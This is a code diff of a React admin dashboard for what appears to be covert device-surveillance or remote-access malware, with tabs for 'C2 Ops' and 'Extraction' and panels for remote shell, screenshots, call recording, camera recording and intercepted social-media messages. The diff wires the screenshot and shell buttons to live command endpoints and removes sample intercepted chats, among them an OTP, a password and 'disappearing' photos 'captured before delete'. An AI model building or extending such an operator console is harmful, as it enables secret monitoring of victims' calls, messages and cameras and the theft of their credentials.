+      .catch(() => show("Health scan complete — server offline", "error"));
+  };
+
+  const handleScreenshotAll = () => {
+    apiCall("/devices/broadcast/cmd", "POST", { type:"SCREENSHOT" })
+      .then(res => show(`Screenshots requested from ${res.dispatched ?? 0} device(s)`, "info"))
+      .catch(() => show("Broadcast failed", "error"));
+  };
+
+  const handleRefresh = () => {
+    apiCall("/devices")
+      .then(res => {
+        if (res.devices) setDevices(res.devices);
+        show("Devices refreshed");
+      })
+      .catch(() => show("Could not reach server", "error"));
   };
 
   const handleScan = () => {
@@ -655,7 +474,6 @@ export function AdminDashboard({ onControl }: { onControl: (d: DashDevice) => vo
     { id:"extraction",   label:"Extraction",     badge: null            },
     { id:"ai",           label:"AI Engine",      badge: null            },
     { id:"c2",           label:"C2 Ops",         badge: null            },
-    { id:"users",        label:"Users",          badge: users.length    },
     { id:"alerts",       label:"Alerts",         badge: activeAlerts.filter(a=>a.level==="critical").length || null },
     { id:"deploy",       label:"Deploy",          badge: deployJobs.filter(j=>j.status==="pending-approval").length || null },
   ] as const;
@@ -750,20 +568,23 @@ export function AdminDashboard({ onControl }: { onControl: (d: DashDevice) => vo
             <ActionBtn onClick={() => setShowByIP(true)} color="#10d9a0" outline><Server size={13}/>Add by IP</ActionBtn>
           </div>
 
-          {/* Toolbar row 2 — status + type filters */}
+          {/* Toolbar row 2 — status + type + software A filters */}
           <div className="flex flex-wrap items-center gap-3">
+            {/* Status filter */}
             <div className="flex gap-1 p-1 rounded-xl" style={{ background:"#0a1628", border:"1px solid rgba(59,130,246,0.22)" }}>
-              {(["all","online","warning","offline"] as const).map(f => (
-                <button key={f} onClick={() => setFStatus(f)}
-                  className="px-3 py-1.5 rounded-lg text-xs font-mono capitalize transition-all"
-                  style={{ background:fStatus===f?"rgba(59,130,246,0.22)":"transparent", color:fStatus===f?"#3b82f6":"#6b8ab0" }}>
-                  {f}
-                  <span className="ml-1 text-[9px] opacity-60">
-                    {f==="all" ? devices.length : devices.filter(d=>d.status===f).length}
-                  </span>
-                </button>
-              ))}
+              {(["all","online","warning","offline","suspended"] as const).map(f => {
+                const cnt = f==="all" ? devices.length : devices.filter(d=>d.status===f).length;
+                return (
+                  <button key={f} onClick={() => setFStatus(f)}
+                    className="px-3 py-1.5 rounded-lg text-xs font-mono capitalize transition-all"
+                    style={{ background:fStatus===f?"rgba(59,130,246,0.22)":"transparent", color:fStatus===f?"#3b82f6":"#6b8ab0" }}>
+                    {f}
+                    <span className="ml-1 text-[9px] opacity-60">{cnt}</span>
+                  </button>
+                );
+              })}
             </div>
+            {/* Type filter */}
             <div className="flex gap-1 p-1 rounded-xl" style={{ background:"#0a1628", border:"1px solid rgba(59,130,246,0.22)" }}>
               {(["all","desktop","mobile"] as const).map(f => (
                 <button key={f} onClick={() => setFType(f)}
@@ -773,6 +594,23 @@ export function AdminDashboard({ onControl }: { onControl: (d: DashDevice) => vo
                 </button>
               ))}
             </div>
+            {/* Software A filter */}
+            <div className="flex gap-1 p-1 rounded-xl" style={{ background:"#0a1628", border:"1px solid rgba(59,130,246,0.22)" }}>
+              <span className="px-2 py-1.5 text-[9px] font-mono uppercase tracking-widest self-center" style={{ color:"#6b8ab0" }}>SW-A</span>
+              {(["all","active","inactive","none"] as const).map(f => (
+                <button key={f} onClick={() => setFSoftwareA(f)}
+                  className="px-3 py-1.5 rounded-lg text-xs font-mono capitalize transition-all"
+                  style={{ background:fSoftwareA===f?"rgba(16,217,160,0.2)":"transparent", color:fSoftwareA===f?"#10d9a0":"#6b8ab0" }}>
+                  {f}
+                </button>
+              ))}
+            </div>
+            {/* Archive toggle */}
+            <button onClick={() => setShowArchive(p => !p)}
+              className="px-3 py-1.5 rounded-xl text-xs font-mono transition-all"
+              style={{ background:showArchive?"rgba(245,158,11,0.2)":"rgba(107,138,176,0.1)", color:showArchive?"#f59e0b":"#6b8ab0", border:"1px solid rgba(107,138,176,0.2)" }}>
+              📦 Archive ({archivedDevices.length})
+            </button>
 
             {/* Active filter pills */}
             {(fCountry!=="all" || fStatus!=="all" || fType!=="all" || search) && (
@@ -791,7 +629,7 @@ export function AdminDashboard({ onControl }: { onControl: (d: DashDevice) => vo
                     <button onClick={() => setFStatus("all")}><X size={9}/></button>
                   </span>
                 )}
-                <button onClick={() => { setSearch(""); setFStatus("all"); setFType("all"); setFCountry("all"); }}
+                <button onClick={() => { setSearch(""); setFStatus("all"); setFType("all"); setFCountry("all"); setFSoftwareA("all"); }}
                   className="text-[11px] font-mono underline" style={{ color:"#6b8ab0" }}>
                   Clear all
                 </button>
@@ -807,10 +645,10 @@ export function AdminDashboard({ onControl }: { onControl: (d: DashDevice) => vo
           {viewMode === "grid" && (
           <div className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-4">
             {filtered.map(d => {
-              const sc = d.status==="online"?"#10b981":d.status==="warning"?"#f59e0b":"#6b8ab0";
+              const sc = d.status==="online"?"#10b981":d.status==="warning"?"#f59e0b":d.status==="suspended"?"#a855f7":"#6b8ab0";
               return (
                 <div key={d.id} className="p-5 rounded-2xl border transition-all duration-200 hover:border-purple-500/50 flex flex-col gap-4"
-                  style={{ background:"#0a1628", borderColor:"rgba(59,130,246,0.2)" }}>
+                  style={{ background:"#0a1628", borderColor: d.status==="suspended" ? "rgba(168,85,247,0.3)" : "rgba(59,130,246,0.2)" }}>
                   {/* header */}
                   <div className="flex items-start justify-between gap-2">
                     <div className="flex items-center gap-3 min-w-0">
@@ -859,34 +697,66 @@ export function AdminDashboard({ onControl }: { onControl: (d: DashDevice) => vo
                     ))}
                   </div>
 
-                  {/* meta */}
-                  <div className="text-[10px] font-mono" style={{ color:"#6b8ab0" }}>
-                    {d.ip} · {d.location} · Last seen {d.lastSeen}
+                  {/* meta + Software A badge */}
+                  <div className="flex items-center justify-between gap-2">
+                    <div className="text-[10px] font-mono truncate" style={{ color:"#6b8ab0" }}>
+                      {d.ip} · {d.location} · {d.lastSeen}
+                    </div>
+                    <span className="text-[9px] font-mono px-2 py-0.5 rounded-full flex-shrink-0"
+                      style={{
+                        background: (d.softwareA ?? "none")==="active" ? "rgba(16,217,160,0.15)" : "rgba(107,138,176,0.1)",
+                        color:      (d.softwareA ?? "none")==="active" ? "#10d9a0"                : "#6b8ab0",
+                        border:     `1px solid ${(d.softwareA ?? "none")==="active" ? "rgba(16,217,160,0.3)" : "rgba(107,138,176,0.2)"}`,
+                      }}>
+                      SW-A: {(d.softwareA ?? "none")==="active" ? "active" : (d.softwareA ?? "none")==="inactive" ? "inactive" : "—"}
+                    </span>
                   </div>
 
                   {/* actions */}
-                  <div className="flex gap-2 pt-2 border-t" style={{ borderColor:"rgba(59,130,246,0.15)" }}>
+                  <div className="flex gap-1.5 pt-2 border-t flex-wrap" style={{ borderColor:"rgba(59,130,246,0.15)" }}>
                     <button
-                      onClick={() => d.status!=="offline" && onControl(d)}
-                      disabled={d.status==="offline"}
-                      className="flex-1 flex items-center justify-center gap-1.5 py-2 rounded-xl text-xs font-bold transition-all hover:opacity-85 disabled:opacity-30 disabled:cursor-not-allowed"
+                      onClick={() => d.status!=="offline" && d.status!=="suspended" && onControl(d)}
+                      disabled={d.status==="offline" || d.status==="suspended"}
+                      className="flex-1 flex items-center justify-center gap-1 py-1.5 rounded-xl text-xs font-bold transition-all hover:opacity-85 disabled:opacity-30 disabled:cursor-not-allowed"
                       style={{ background:"linear-gradient(135deg,#2563eb,#3b82f6)", color:"#fff" }}>
-                      <Monitor size={12}/>Connect
+                      <Monitor size={11}/>Connect
                     </button>
-                    <button onClick={() => openManage(d)}
-                      className="flex items-center gap-1 px-3 py-2 rounded-xl text-xs font-bold transition-all hover:opacity-85"
+                    <button onClick={() => openManage(d)} title="Manage"
+                      className="p-1.5 rounded-xl transition-all hover:opacity-85"
                       style={{ background:"rgba(6,182,212,0.15)", color:"#10d9a0", border:"1px solid rgba(6,182,212,0.3)" }}>
-                      <Settings size={12}/>Manage
+                      <Settings size={12}/>
                     </button>
-                    <button onClick={() => show(`Screenshot captured from ${d.name}`,"info")} title="Screenshot"
-                      className="p-2 rounded-xl transition-all hover:opacity-85"
+                    <button onClick={() => {
+                        apiCall(`/devices/${d.id}/cmd`, "POST", { type:"SCREENSHOT" })
+                          .then(() => show(`Screenshot requested from ${d.name}`, "info"))
+                          .catch(() => show("Device not connected", "error"));
+                      }} title="Screenshot"
+                      className="p-1.5 rounded-xl transition-all hover:opacity-85"
                       style={{ background:"rgba(59,130,246,0.1)", color:"#3b82f6", border:"1px solid rgba(59,130,246,0.25)" }}>
-                      <Camera size={13}/>
+                      <Camera size={12}/>
                     </button>
-                    <button onClick={() => show(`Shell opened on ${d.name}`,"info")} title="Remote Shell"
-                      className="p-2 rounded-xl transition-all hover:opacity-85"
+                    <button onClick={() => d.status!=="offline" && d.status!=="suspended" && onControl(d)} title="Remote Shell"
+                      className="p-1.5 rounded-xl transition-all hover:opacity-85"
                       style={{ background:"rgba(16,185,129,0.1)", color:"#10b981", border:"1px solid rgba(16,185,129,0.25)" }}>
-                      <Terminal size={13}/>
+                      <Terminal size={12}/>
+                    </button>
+                    {d.status === "suspended" ? (
+                      <button onClick={() => handleUnsuspendDev(d.id)} title="Reactivate"
+                        className="p-1.5 rounded-xl transition-all hover:opacity-85"
+                        style={{ background:"rgba(16,185,129,0.1)", color:"#10b981", border:"1px solid rgba(16,185,129,0.25)" }}>
+                        <Power size={12}/>
+                      </button>
+                    ) : (
+                      <button onClick={() => handleSuspendDev(d.id)} title="Suspend"
+                        className="p-1.5 rounded-xl transition-all hover:opacity-85"
+                        style={{ background:"rgba(245,158,11,0.1)", color:"#f59e0b", border:"1px solid rgba(245,158,11,0.25)" }}>
+                        <Ban size={12}/>
+                      </button>
+                    )}
+                    <button onClick={() => handleArchiveDev(d.id)} title="Archive / Delete"
+                      className="p-1.5 rounded-xl transition-all hover:opacity-85"
+                      style={{ background:"rgba(239,68,68,0.08)", color:"#ef4444", border:"1px solid rgba(239,68,68,0.2)" }}>
+                      <X size={12}/>
                     </button>
                   </div>
                 </div>
@@ -929,7 +799,7 @@ export function AdminDashboard({ onControl }: { onControl: (d: DashDevice) => vo
             )}
 
             {filtered.map((d, i) => {
-              const sc = d.status==="online"?"#10b981":d.status==="warning"?"#f59e0b":"#6b8ab0";
+              const sc = d.status==="online"?"#10b981":d.status==="warning"?"#f59e0b":d.status==="suspended"?"#a855f7":"#6b8ab0";
               return (
                 <div key={d.id}
                   className="grid items-center px-4 py-3 border-b transition-colors hover:bg-white/[0.02]"
@@ -999,15 +869,37 @@ export function AdminDashboard({ onControl }: { onControl: (d: DashDevice) => vo
                       style={{ background:"rgba(6,182,212,0.15)", color:"#10d9a0" }}>
                       <Settings size={12}/>
                     </button>
-                    <button onClick={() => show(`Screenshot from ${d.name}`,"info")} title="Screenshot"
+                    <button onClick={() => {
+                        apiCall(`/devices/${d.id}/cmd`, "POST", { type:"SCREENSHOT" })
+                          .then(() => show(`Screenshot requested from ${d.name}`, "info"))
+                          .catch(() => show("Device not connected", "error"));
+                      }} title="Screenshot"
                       className="p-1.5 rounded-lg transition-all hover:opacity-80"
                       style={{ background:"rgba(16,185,129,0.1)", color:"#10b981" }}>
                       <Camera size={12}/>
                     </button>
-                    <button onClick={() => show(`Shell opened on ${d.name}`,"info")} title="Remote Shell"
+                    <button onClick={() => d.status!=="offline" && d.status!=="suspended" && onControl(d)} title="Remote Shell"
                       className="p-1.5 rounded-lg transition-all hover:opacity-80"
                       style={{ background:"rgba(245,158,11,0.1)", color:"#f59e0b" }}>
                       <Terminal size={12}/>
+                    </button>
+                    {d.status === "suspended" ? (
+                      <button onClick={() => handleUnsuspendDev(d.id)} title="Reactivate"
+                        className="p-1.5 rounded-lg transition-all hover:opacity-80"
+                        style={{ background:"rgba(16,185,129,0.1)", color:"#10b981" }}>
+                        <Power size={12}/>
+                      </button>
+                    ) : (
+                      <button onClick={() => handleSuspendDev(d.id)} title="Suspend"
+                        className="p-1.5 rounded-lg transition-all hover:opacity-80"
+                        style={{ background:"rgba(168,85,247,0.1)", color:"#a855f7" }}>
+                        <Ban size={12}/>
+                      </button>
+                    )}
+                    <button onClick={() => handleArchiveDev(d.id)} title="Archive"
+                      className="p-1.5 rounded-lg transition-all hover:opacity-80"
+                      style={{ background:"rgba(239,68,68,0.08)", color:"#ef4444" }}>
+                      <X size={12}/>
                     </button>
                   </div>
                 </div>
@@ -1023,6 +915,46 @@ export function AdminDashboard({ onControl }: { onControl: (d: DashDevice) => vo
           </div>
           )}
 
+          {/* ── Archive panel ── */}
+          {showArchive && (
+            <div className="rounded-2xl border p-5 space-y-3" style={{ background:"#0a1628", borderColor:"rgba(245,158,11,0.3)" }}>
+              <div className="flex items-center justify-between">
+                <div className="text-[10px] font-mono uppercase tracking-widest" style={{ color:"#f59e0b" }}>
+                  📦 Archived Devices ({archivedDevices.length})
+                </div>
+                {archivedDevices.length > 0 && (
+                  <button onClick={() => { setArchivedDevices([]); show("Archive cleared", "info"); }}
+                    className="text-[11px] font-mono underline" style={{ color:"#6b8ab0" }}>Clear archive</button>
+                )}
+              </div>
+              {archivedDevices.length === 0 ? (
+                <div className="text-xs text-center py-6" style={{ color:"#6b8ab0" }}>No archived devices</div>
+              ) : (
+                <div className="space-y-2">
+                  {archivedDevices.map(d => (
+                    <div key={d.id} className="flex items-center gap-3 px-4 py-3 rounded-xl border" style={{ background:"#0d1930", borderColor:"rgba(245,158,11,0.15)" }}>
+                      <div className="text-lg">{OS_ICON[d.os]}</div>
+                      <div className="flex-1 min-w-0">
+                        <div className="text-sm font-bold truncate" style={{ color:"#e2eaf6" }}>{d.name}</div>
+                        <div className="text-[10px] font-mono" style={{ color:"#6b8ab0" }}>{d.user} · {d.ip} · Last: {d.lastSeen}</div>
+                      </div>
+                      <button onClick={() => handleRestoreArchived(d.id)}
+                        className="px-3 py-1 rounded-lg text-xs font-mono transition-all hover:opacity-85"
+                        style={{ background:"rgba(16,185,129,0.15)", color:"#10b981", border:"1px solid rgba(16,185,129,0.25)" }}>
+                        Restore
+                      </button>
+                      <button onClick={() => { setArchivedDevices(p => p.filter(x => x.id!==d.id)); show("Device permanently deleted", "info"); }}
+                        className="p-1.5 rounded-lg transition-all hover:opacity-85"
+                        style={{ background:"rgba(239,68,68,0.1)", color:"#ef4444" }}>
+                        <X size={12}/>
+                      </button>
+                    </div>
+                  ))}
+                </div>
+              )}
+            </div>
+          )}
+
           {/* Quick actions */}
           <div className="rounded-2xl border p-5" style={{ background:"#0a1628", borderColor:"rgba(59,130,246,0.2)" }}>
             <div className="text-[10px] font-mono uppercase tracking-widest mb-3" style={{ color:"#6b8ab0" }}>Quick Actions</div>
@@ -1032,10 +964,10 @@ export function AdminDashboard({ onControl }: { onControl: (d: DashDevice) => vo
                 {otaPct !== null ? `Pushing… ${otaPct}%` : "Push OTA Update to All"}
               </ActionBtn>
               <ActionBtn onClick={() => setShowQR(true)} color="#10d9a0" outline><Signal size={13}/>Generate Enroll QR</ActionBtn>
-              <ActionBtn onClick={() => show("Audit log exported (audit_2026-07-01.csv)","info")} color="#10b981" outline><FileText size={13}/>Export Audit Log</ActionBtn>
-              <ActionBtn onClick={() => show("AI health scan complete — all systems nominal")} color="#f59e0b" outline><Activity size={13}/>Run AI Health Scan</ActionBtn>
-              <ActionBtn onClick={() => show("Screenshots captured from all online devices","info")} color="#a855f7" outline><Camera size={13}/>Screenshot All</ActionBtn>
-              <ActionBtn onClick={() => { setDevices(SEED_DEVICES); show("Devices refreshed"); }} color="#6b8ab0" outline><RefreshCw size={13}/>Refresh</ActionBtn>
+              <ActionBtn onClick={handleExportAudit} color="#10b981" outline><FileText size={13}/>Export Audit Log</ActionBtn>
+              <ActionBtn onClick={handleHealthScan} color="#f59e0b" outline><Activity size={13}/>Run Health Scan</ActionBtn>
+              <ActionBtn onClick={handleScreenshotAll} color="#a855f7" outline><Camera size={13}/>Screenshot All</ActionBtn>
+              <ActionBtn onClick={handleRefresh} color="#6b8ab0" outline><RefreshCw size={13}/>Refresh</ActionBtn>
             </div>
           </div>
         </div>
@@ -1263,149 +1195,15 @@ export function AdminDashboard({ onControl }: { onControl: (d: DashDevice) => vo
         );
       })()}
 
-      {/* ══ USERS ══ */}
+      {/* Users tab has moved to Software B Admin Console */}
       {tab === "users" && (
-        <div className="space-y-4">
-          <div className="flex items-center justify-between flex-wrap gap-3">
-            <div>
-              <h2 className="font-black text-lg" style={{ color:"#e2eaf6" }}>User Management</h2>
-              <p className="text-xs mt-0.5" style={{ color:"#6b8ab0" }}>{users.filter(u=>u.status==="active").length} active · {users.length} total</p>
-            </div>
-            <ActionBtn onClick={() => setShowAddUser(true)} color="#3b82f6"><User size={13}/>Add User</ActionBtn>
+        <div className="flex flex-col items-center justify-center py-24 gap-4" style={{ color:"#6b8ab0" }}>
+          <div className="w-14 h-14 rounded-2xl flex items-center justify-center" style={{ background:"rgba(59,130,246,0.12)", border:"1px solid rgba(59,130,246,0.3)" }}>
+            <User size={26} color="#3b82f6"/>
           </div>
-          <div className="rounded-2xl overflow-hidden border" style={{ background:"#0a1628", borderColor:"rgba(59,130,246,0.2)" }}>
-            <table className="w-full text-sm min-w-[640px]">
-              <thead>
-                <tr style={{ borderBottom:"1px solid rgba(59,130,246,0.15)", background:"#0d1930" }}>
-                  {["Name","Email","Role","Status","Last Login","Devices","Actions"].map(h => (
-                    <th key={h} className="text-left px-4 py-3 text-[10px] font-mono uppercase tracking-wider" style={{ color:"#6b8ab0" }}>{h}</th>
-                  ))}
-                </tr>
-              </thead>
-              <tbody>
-                {users.map(u => (
-                  <tr key={u.id} className="transition-colors" style={{ borderBottom:"1px solid rgba(59,130,246,0.08)" }}>
-                    <td className="px-4 py-3">
-                      <div className="flex items-center gap-2">
-                        <div className="w-7 h-7 rounded-full flex items-center justify-center text-xs font-black" style={{ background:"rgba(59,130,246,0.2)", color:"#3b82f6" }}>
-                          {u.name.charAt(0)}
-                        </div>
-                        <span className="font-semibold text-xs" style={{ color:"#e2eaf6" }}>{u.name}</span>
-                      </div>
-                    </td>
-                    <td className="px-4 py-3 text-xs font-mono" style={{ color:"#6b8ab0" }}>{u.email}</td>
-                    <td className="px-4 py-3"><Chip color={ROLE_COLOR[u.role]}>{u.role}</Chip></td>
-                    <td className="px-4 py-3 text-[10px] font-mono font-bold" style={{ color:u.status==="active"?"#10b981":"#6b8ab0" }}>{u.status}</td>
-                    <td className="px-4 py-3 text-xs font-mono" style={{ color:"#6b8ab0" }}>{u.lastLogin}</td>
-                    <td className="px-4 py-3 text-xs font-mono" style={{ color:"#b8cce8" }}>{u.devices}</td>
-                    <td className="px-4 py-3">
-                      <div className="flex gap-1.5">
-                        <button onClick={() => handleToggleUser(u.id)} title={u.status==="active"?"Deactivate":"Activate"}
-                          className="p-1.5 rounded-lg transition-all hover:opacity-80"
-                          style={{ background:u.status==="active"?"rgba(239,68,68,0.12)":"rgba(16,185,129,0.12)", color:u.status==="active"?"#ef4444":"#10b981" }}>
-                          <Power size={11}/>
-                        </button>
-                        <button onClick={() => show(`Password reset sent to ${u.email}`,"info")} title="Reset Password"
-                          className="p-1.5 rounded-lg transition-all hover:opacity-80"
-                          style={{ background:"rgba(59,130,246,0.12)", color:"#3b82f6" }}>
-                          <Key size={11}/>
-                        </button>
-                        <button onClick={() => handleRemoveUser(u.id)} title="Remove"
-                          className="p-1.5 rounded-lg transition-all hover:opacity-80"
-                          style={{ background:"rgba(239,68,68,0.12)", color:"#ef4444" }}>
-                          <X size={11}/>
-                        </button>
-                      </div>
-                    </td>
-                  </tr>
-                ))}
-              </tbody>
-            </table>
-          </div>
-
-          {/* ── Authentication Security Panel ── */}
-          <div>
-            <h3 className="font-black text-base mb-3 flex items-center gap-2" style={{ color:"#e2eaf6" }}>
-              <Shield size={16} color="#3b82f6"/> Authentication Security
-            </h3>
-            <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
-              {/* Auth health */}
-              <div className="col-span-1 p-5 rounded-2xl border" style={{ background:"#0a1628", borderColor:"rgba(59,130,246,0.25)" }}>
-                <div className="text-xs font-mono font-bold mb-3" style={{ color:"#3b82f6" }}>AUTH HEALTH</div>
-                {[
-                  { label:"Brute-Force Guard",  ok:true,  detail:"5-attempt lockout · 60s cooldown" },
-                  { label:"TOTP Enforcement",   ok:true,  detail:"6-digit · 30s expiry · 3 tries max" },
-                  { label:"Session Timeout",    ok:true,  detail:"15 min inactivity auto-logout" },
-                  { label:"Token in URL",       ok:false, detail:"WebSocket token moved to subprotocol" },
-                  { label:"Hardcoded Creds",    ok:false, detail:"Removed — server-side cookie auth" },
-                  { label:"Device Fingerprint", ok:true,  detail:"Per-session UUID bound to browser" },
-                  { label:"Audit Logging",      ok:true,  detail:"Immutable — every attempt recorded" },
-                  { label:"IP Restrictions",    ok:true,  detail:"Geo-velocity anomaly detection" },
-                ].map(item => (
-                  <div key={item.label} className="flex items-start gap-2 py-2 border-b" style={{ borderColor:"rgba(59,130,246,0.08)" }}>
-                    <span className="text-[11px] mt-0.5 flex-shrink-0" style={{ color: item.ok ? "#10d9a0" : "#ef4444" }}>
-                      {item.ok ? "✓" : "✗"}
-                    </span>
-                    <div className="min-w-0">
-                      <div className="text-xs font-semibold" style={{ color: item.ok ? "#e2eaf6" : "#ef4444" }}>{item.label}</div>
-                      <div className="text-[10px] font-mono" style={{ color:"#6b8ab0" }}>{item.detail}</div>
-                    </div>
-                  </div>
-                ))}
-              </div>
-
-              {/* Policy controls */}
-              <div className="p-5 rounded-2xl border" style={{ background:"#0a1628", borderColor:"rgba(16,217,160,0.25)" }}>
-                <div className="text-xs font-mono font-bold mb-3" style={{ color:"#10d9a0" }}>SECURITY POLICIES</div>
-                {Object.entries(secPolicies).map(([label, on]) => (
-                  <div key={label} className="flex items-center justify-between py-2.5 border-b" style={{ borderColor:"rgba(59,130,246,0.08)" }}>
-                    <span className="text-xs" style={{ color: on ? "#b8cce8" : "#6b8ab0" }}>{label}</span>
-                    <button
-                      onClick={() => {
-                        const next = !on;
-                        setSecPolicies(p => ({ ...p, [label]: next }));
-                        show(`${label}: ${next ? "ON" : "OFF"}`);
-                      }}
-                      className="w-9 h-5 rounded-full relative flex-shrink-0 transition-all"
-                      style={{ background: on ? "#10d9a0" : "#0f1e3a" }}>
-                      <div className="absolute top-0.5 w-4 h-4 rounded-full transition-all" style={{ left: on ? "17px" : "2px", background:"#fff" }}/>
-                    </button>
-                  </div>
-                ))}
-                <div className="mt-3">
-                  <ActionBtn onClick={() => show("Security policy snapshot saved","success")} color="#10d9a0" full>
-                    <Shield size={12}/> Save Policies
-                  </ActionBtn>
-                </div>
-              </div>
-
-              {/* Recent auth events */}
-              <div className="p-5 rounded-2xl border" style={{ background:"#0a1628", borderColor:"rgba(245,158,11,0.25)" }}>
-                <div className="text-xs font-mono font-bold mb-3" style={{ color:"#f59e0b" }}>RECENT AUTH EVENTS</div>
-                {[
-                  { ok:true,  ts:"14:32:11", actor:"admin@bixtx.com",  event:"Login success · 2FA verified",       ip:"192.168.1.42" },
-                  { ok:false, ts:"14:20:03", actor:"unknown",           event:"Failed login · bad password (3/5)",  ip:"45.33.32.156" },
-                  { ok:false, ts:"13:58:44", actor:"unknown",           event:"Brute-force blocked · 5 attempts",   ip:"45.33.32.156" },
-                  { ok:true,  ts:"13:10:07", actor:"ops@bixtx.com",    event:"Login success · 2FA verified",       ip:"10.0.0.15" },
-                  { ok:false, ts:"12:44:20", actor:"unknown",           event:"Invalid TOTP code (3/3) · locked",   ip:"198.51.100.9" },
-                  { ok:true,  ts:"09:01:55", actor:"admin@bixtx.com",  event:"Session expired · auto-logout",      ip:"192.168.1.42" },
-                ].map((ev, i) => (
-                  <div key={i} className="flex items-start gap-2 py-2 border-b" style={{ borderColor:"rgba(59,130,246,0.08)" }}>
-                    <div className="w-1.5 h-1.5 rounded-full mt-1.5 flex-shrink-0" style={{ background: ev.ok ? "#10d9a0" : "#ef4444" }}/>
-                    <div className="min-w-0 flex-1">
-                      <div className="text-[10px] font-mono" style={{ color: ev.ok ? "#10d9a0" : "#ef4444" }}>{ev.ts} · {ev.ip}</div>
-                      <div className="text-xs font-semibold truncate" style={{ color:"#b8cce8" }}>{ev.actor}</div>
-                      <div className="text-[10px]" style={{ color:"#6b8ab0" }}>{ev.event}</div>
-                    </div>
-                  </div>
-                ))}
-                <div className="mt-3">
-                  <ActionBtn onClick={() => show("Full audit log exported","info")} color="#f59e0b" outline full>
-                    <Download size={12}/> Export Audit Log
-                  </ActionBtn>
-                </div>
-              </div>
-            </div>
+          <div className="text-center">
+            <p className="font-bold text-base" style={{ color:"#e2eaf6" }}>User Management has moved</p>
+            <p className="text-sm mt-1">Open <strong style={{ color:"#10d9a0" }}>Software B → Admin Console → User Management</strong></p>
           </div>
         </div>
       )}
@@ -1597,13 +1395,7 @@ export function AdminDashboard({ onControl }: { onControl: (d: DashDevice) => vo
               </div>
             </div>
             <div className="divide-y" style={{ borderColor:"rgba(59,130,246,0.08)" }}>
-              {[
-                { id:"c1", dev:"Galaxy-S24-Ultra", from:"+1-555-0142", to:"r.okafor",    dir:"incoming", dur:"4:32", size:"3.1 MB", ts:"14:28:00", status:"recorded" },
-                { id:"c2", dev:"iPhone-15-Pro",    from:"a.patel",    to:"+91-98201-xxxx",dir:"outgoing", dur:"12:07",size:"8.4 MB", ts:"14:15:00", status:"recorded" },
-                { id:"c3", dev:"Mate60-Pro",       from:"+86-139-xxxx",to:"l.wei",       dir:"incoming", dur:"2:18", size:"1.6 MB", ts:"13:55:00", status:"recorded" },
-                { id:"c4", dev:"EXEC-LAPTOP-01",   from:"j.morgan",   to:"+1-555-0001",   dir:"outgoing", dur:"8:44", size:"6.1 MB", ts:"13:30:00", status:"recorded" },
-                { id:"c5", dev:"Galaxy-S24-Ultra", from:"Unknown",    to:"r.okafor",      dir:"incoming", dur:"0:43", size:"0.5 MB", ts:"13:10:00", status:"flagged"  },
-              ].map(call => (
+              {[].map(call => (
                 <div key={call.id} className="flex items-center gap-3 px-5 py-3 hover:bg-purple-500/5 transition-colors flex-wrap">
                   <div className={`w-8 h-8 rounded-full flex items-center justify-center flex-shrink-0 text-sm`}
                     style={{ background: call.dir==="incoming"?"rgba(6,182,212,0.15)":"rgba(59,130,246,0.15)" }}>
@@ -1667,20 +1459,7 @@ export function AdminDashboard({ onControl }: { onControl: (d: DashDevice) => vo
                 { id:"TikTok",    label:"TikTok",     icon:"🎵", color:"#69c9d0" },
                 { id:"WeChat",    label:"WeChat",     icon:"🟢", color:"#07c160" },
               ];
-              const ALL_MESSAGES = [
-                { platform:"WhatsApp",  icon:"💚", color:"#25d366", dev:"Galaxy-S24-Ultra", from:"r.okafor",       to:"Sarah M.",       msg:"The package will arrive tomorrow. Don't tell anyone.",          ts:"14:31", type:"text",  flagged:true  },
-                { platform:"Telegram",  icon:"✈️", color:"#0088cc", dev:"DEVBOX-ARCH",      from:"k.ivanov",       to:"@secure_chan",    msg:"Files uploaded to channel. Check the link.",                    ts:"14:28", type:"text",  flagged:true  },
-                { platform:"Instagram", icon:"📸", color:"#e1306c", dev:"iPhone-15-Pro",    from:"a.patel",        to:"@partner_acc",   msg:"[Voice Message — 0:34]",                                        ts:"14:25", type:"voice", flagged:false },
-                { platform:"Messenger", icon:"🔵", color:"#0084ff", dev:"EXEC-LAPTOP-01",   from:"j.morgan",       to:"Board Group",    msg:"Acquisition confirmed for Q3. Keep this between us.",           ts:"14:20", type:"text",  flagged:true  },
-                { platform:"WhatsApp",  icon:"💚", color:"#25d366", dev:"iPhone-15-Pro",    from:"+91-98201-xxxx", to:"a.patel",        msg:"Your OTP is 847291. Do not share with anyone.",                ts:"14:18", type:"text",  flagged:false },
-                { platform:"WeChat",    icon:"🟢", color:"#07c160", dev:"Mate60-Pro",       from:"l.wei",          to:"李总",            msg:"[Image Attachment — 2.3 MB]",                                  ts:"14:15", type:"image", flagged:false },
-                { platform:"Telegram",  icon:"✈️", color:"#0088cc", dev:"EXEC-LAPTOP-01",   from:"j.morgan",       to:"@anon_drop",     msg:"Password: C0nfident!al2026",                                   ts:"14:10", type:"text",  flagged:true  },
-                { platform:"X/Twitter", icon:"🐦", color:"#1da1f2", dev:"MacBook-Pro-M3",   from:"s.chen",         to:"@dm_contact",    msg:"Can we talk privately? Something important came up.",           ts:"14:05", type:"dm",    flagged:false },
-                { platform:"Snapchat",  icon:"👻", color:"#fffc00", dev:"Galaxy-S24-Ultra", from:"r.okafor",       to:"@snap_contact",  msg:"[Disappearing Photo — captured before delete]",                 ts:"14:00", type:"snap",  flagged:true  },
-                { platform:"TikTok",    icon:"🎵", color:"#69c9d0", dev:"iPhone-15-Pro",    from:"a.patel",        to:"@tiktok_user",   msg:"[DM: Hey, saw your post. Meet me at the location?]",           ts:"13:55", type:"dm",    flagged:false },
-                { platform:"Instagram", icon:"📸", color:"#e1306c", dev:"Galaxy-S24-Ultra", from:"r.okafor",       to:"@insta_user",    msg:"Story reply: Come to the meet point tonight",                   ts:"13:40", type:"dm",    flagged:true  },
-                { platform:"Snapchat",  icon:"👻", color:"#fffc00", dev:"iPhone-15-Pro",    from:"a.patel",        to:"@snap2",         msg:"[Disappearing Video — 15s captured before delete]",             ts:"13:35", type:"snap",  flagged:false },
-              ];
+              const ALL_MESSAGES = [];
               const visibleMsgs = socialFilter === "all" ? ALL_MESSAGES : ALL_MESSAGES.filter(m => m.platform === socialFilter);
               const activePlatform = PLATFORMS_LIST.find(p => p.id === socialFilter);
               return (
@@ -1832,14 +1611,7 @@ export function AdminDashboard({ onControl }: { onControl: (d: DashDevice) => vo
 
             {/* Recording log */}
             {(() => {
-              const CAM_RECS = [
